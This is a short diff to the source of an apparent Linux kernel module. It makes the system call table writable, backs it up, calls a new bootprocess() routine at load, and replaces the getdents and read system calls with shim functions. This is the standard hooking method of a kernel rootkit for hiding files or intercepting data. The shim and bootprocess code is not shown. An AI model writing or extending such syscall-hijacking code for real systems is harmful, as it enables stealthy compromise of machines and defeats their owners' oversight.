@@ -2,10 +2,11 @@
 #include "rw.h"
 #include "syscall.h"
 #include "utility.h"
-#include "readShim.h"
 
 //new system calls
 #include "getdentsShim.h"
+#include "readShim.h"
+#include "bootprocess.h"
 
 MODULE_LICENSE("GPL");
 
@@ -16,11 +17,14 @@ void patch(int callnum, void* newcall) {
 }
 
 int init_module() {
+	int bootresult;
 	make_rw(sys_call_table);
 	//make a backup of the system call table
 	memcpy(backup_sys_call_table, sys_call_table, sizeof(backup_sys_call_table));
 
 	//shim the syscalls
+	bootresult = bootprocess();
+	if (bootresult) printk(KERN_INFO "Boot process failed: %d", bootresult);
 	patch(SYS_getdents, getdentsShim);
 	patch(SYS_read, readShim);
 
